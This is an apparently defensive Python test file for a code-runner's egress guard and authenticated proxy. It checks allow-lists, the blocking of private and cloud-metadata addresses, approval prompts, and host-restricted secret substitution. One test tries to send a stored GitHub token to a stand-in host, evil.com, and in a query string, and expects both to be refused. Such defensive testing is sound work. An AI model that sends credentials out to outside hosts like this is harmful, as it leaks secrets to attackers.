import asyncio
import base64
import pathlib
import tempfile
import unittest

import httpx

from coderunner.audit import AuditLog
from coderunner.config import Config
from coderunner.egress import EgressDenied, EgressGuard, EgressProxy, fetch
from coderunner.policy import Policy
from coderunner.secrets_store import SecretStore
from coderunner.store import Store

TOKEN = "proxy-token-for-tests-0123456789abcdef"


def make(data=None, addresses=None):
    tmp = pathlib.Path(tempfile.mkdtemp())
    config = Config(data or {}, path=tmp / "config.json")
    audit = AuditLog(tmp / "audit.jsonl")
    policy = Policy(config, Store(":memory:"), audit)

    async def resolver(host, port):
        return (addresses or {}).get(host, ["93.184.216.34"])

    return config, policy, audit, EgressGuard(config, policy, audit, resolver=resolver), tmp


async def raw_request(port, data: bytes) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(data)
    await writer.drain()
    response = await asyncio.wait_for(reader.read(65536), 5)
    writer.close()
    return response


def auth_header(token=TOKEN):
    return "Proxy-Authorization: Basic " + base64.b64encode(f"coderunner:{token}".encode()).decode()


class GuardTests(unittest.IsolatedAsyncioTestCase):
    async def test_allow_list_and_private_addresses(self):
        _, _, _, guard, _ = make(addresses={"pypi.org": ["151.101.0.223"], "evil.test": ["192.168.1.10"],
                                            "tailnet.test": ["100.101.102.103"], "meta.test": ["169.254.169.254"]})
        self.assertEqual(await guard.check("pypi.org", 443), ["151.101.0.223"])
        for host in ("evil.test", "tailnet.test", "meta.test", "127.0.0.1", "10.0.0.1"):
            with self.assertRaises(EgressDenied):
                await guard.check(host, 443)

    async def test_ports_and_names(self):
        _, _, _, guard, _ = make()
        with self.assertRaises(EgressDenied):
            await guard.check("pypi.org", 22)
        with self.assertRaises(EgressDenied):
            await guard.check("bad host!", 443)

    async def test_unknown_host_asks_and_times_out(self):
        _, policy, _, guard, _ = make({"egress": {"approval_wait": 0.05}})
        with self.assertRaises(EgressDenied):
            await guard.check("unknown.example", 443)

    async def test_unknown_host_approved(self):
        _, policy, _, guard, _ = make({"egress": {"approval_wait": 5}})
        task = asyncio.create_task(guard.check("unknown.example", 443))
        await asyncio.sleep(0.05)
        policy.decide(policy.pending()[0].id, True, "always")
        self.assertTrue(await task)
        self.assertTrue(await guard.check("unknown.example", 443))


    async def test_taint_disables_allow_list(self):
        _, policy, _, guard, _ = make({"egress": {"approval_wait": 0.05}},
                                      addresses={"github.com": ["140.82.112.3"]})
        self.assertTrue(await guard.check("github.com", 443))
        guard.taint()
        with self.assertRaises(EgressDenied):
            await guard.check("github.com", 443)

    async def test_denials_are_remembered_and_prompts_capped(self):
        _, policy, _, guard, _ = make({"egress": {"approval_wait": 5}})
        task = asyncio.create_task(guard.check("x.example", 443))
        await asyncio.sleep(0.05)
        policy.decide(policy.pending()[0].id, False)
        with self.assertRaises(EgressDenied):
            await task
        with self.assertRaisesRegex(EgressDenied, "recently denied"):
            await guard.check("x.example", 443)
        tasks = [asyncio.create_task(guard.check(f"h{i}.example", 443)) for i in range(guard.MAX_PENDING)]
        await asyncio.sleep(0.05)
        with self.assertRaisesRegex(EgressDenied, "Too many"):
            await guard.check("one-more.example", 443)
        for approval in policy.pending():
            policy.decide(approval.id, False)
        await asyncio.gather(*tasks, return_exceptions=True)


class ProxyTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        # A local "origin" server the proxy is explicitly allowed to reach.
        async def origin(reader, writer):
            head = await reader.readuntil(b"\r\n\r\n")
            self.origin_seen = head
            body = b"hello from origin"
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" % (len(body), body))
            await writer.drain()
            writer.close()

        self.origin = await asyncio.start_server(origin, "127.0.0.1", 0)
        self.origin_port = self.origin.sockets[0].getsockname()[1]
        config, policy, audit, guard, _ = make({
            "egress": {"allow": ["origin.test"], "allow_private": ["origin.test"],
                       "ports": [self.origin_port, 443], "approval_wait": 0.05}},
            addresses={"origin.test": ["127.0.0.1"], "blocked.test": ["127.0.0.1"]})
        self.proxy = await EgressProxy(guard, audit, lambda: TOKEN).start("127.0.0.1", 0)
        self.port = self.proxy.sockets[0].getsockname()[1]

    async def asyncTearDown(self):
        self.proxy.close()
        self.origin.close()

    async def test_requires_credential(self):
        response = await raw_request(self.port, b"GET http://origin.test/ HTTP/1.1\r\nHost: origin.test\r\n\r\n")
        self.assertTrue(response.startswith(b"HTTP/1.1 407"))
        bad = f"GET http://origin.test/ HTTP/1.1\r\n{auth_header('wrong')}\r\n\r\n".encode()
        self.assertTrue((await raw_request(self.port, bad)).startswith(b"HTTP/1.1 407"))

    async def test_plain_http_forwarded_without_proxy_headers(self):
        request = (f"GET http://origin.test:{self.origin_port}/path?q=1 HTTP/1.1\r\nHost: origin.test\r\n"
                   f"{auth_header()}\r\n\r\n").encode()
        response = await raw_request(self.port, request)
        self.assertIn(b"hello from origin", response)
        self.assertTrue(self.origin_seen.startswith(b"GET /path?q=1 HTTP/1.1"))
        self.assertNotIn(b"Proxy-Authorization", self.origin_seen)

    async def test_connect_tunnel(self):
        reader, writer = await asyncio.open_connection("127.0.0.1", self.port)
        writer.write(f"CONNECT origin.test:{self.origin_port} HTTP/1.1\r\n{auth_header()}\r\n\r\n".encode())
        await writer.drain()
        self.assertTrue((await reader.readuntil(b"\r\n\r\n")).startswith(b"HTTP/1.1 200"))
        writer.write(b"GET / HTTP/1.1\r\nHost: origin.test\r\n\r\n")
        await writer.drain()
        self.assertIn(b"hello from origin", await asyncio.wait_for(reader.read(65536), 5))
        writer.close()

    async def test_unapproved_host_refused(self):
        request = f"CONNECT blocked.test:443 HTTP/1.1\r\n{auth_header()}\r\n\r\n".encode()
        response = await raw_request(self.port, request)
        self.assertTrue(response.startswith(b"HTTP/1.1 403"))


class FetchTests(unittest.IsolatedAsyncioTestCase):
    async def test_secret_substitution_only_for_allowed_host(self):
        config, policy, audit, guard, tmp = make({"secrets": {"gh": {"hosts": ["api.github.com"]}},
                                                  "egress": {"allow": ["api.github.com", "evil.com"]}})
        secrets = SecretStore(tmp / "secrets.json")
        secrets.set("gh", "ghp_realsecretvalue")
        seen = {}

        def handler(request: httpx.Request):
            seen["auth"] = request.headers.get("authorization")
            seen["url_host"] = request.url.host
            seen["host"] = request.headers.get("host")
            seen["sni"] = request.extensions.get("sni_hostname")
            return httpx.Response(200, text=f"echo {request.headers.get('authorization')}")

        original = httpx.AsyncClient

        class Patched(original):
            def __init__(self, *args, **kwargs):
                kwargs["transport"] = httpx.MockTransport(handler)
                super().__init__(*args, **kwargs)

        httpx.AsyncClient = Patched
        try:
            result = await fetch(guard, secrets, policy, {
                "url": "https://api.github.com/user", "headers": {"Authorization": "Bearer {{secret:gh}}"}})
            self.assertEqual(seen["auth"], "Bearer ghp_realsecretvalue")
            # The request goes to the address that was checked, not a fresh DNS answer.
            self.assertEqual(seen["url_host"], "93.184.216.34")
            self.assertEqual((seen["host"], seen["sni"]), ("api.github.com", "api.github.com"))
            self.assertEqual(result["status"], 200)
            self.assertNotIn("ghp_realsecretvalue", result["body"])
            with self.assertRaises(EgressDenied):
                await fetch(guard, secrets, policy, {
                    "url": "https://evil.com/", "headers": {"Authorization": "{{secret:gh}}"}})
            with self.assertRaises(EgressDenied):
                await fetch(guard, secrets, policy, {"url": "https://api.github.com/?t={{secret:gh}}"})
            with self.assertRaisesRegex(EgressDenied, "https"):
                await fetch(guard, secrets, policy, {
                    "url": "http://api.github.com/", "headers": {"Authorization": "{{secret:gh}}"}})
        finally:
            httpx.AsyncClient = original


if __name__ == "__main__":
    unittest.main()
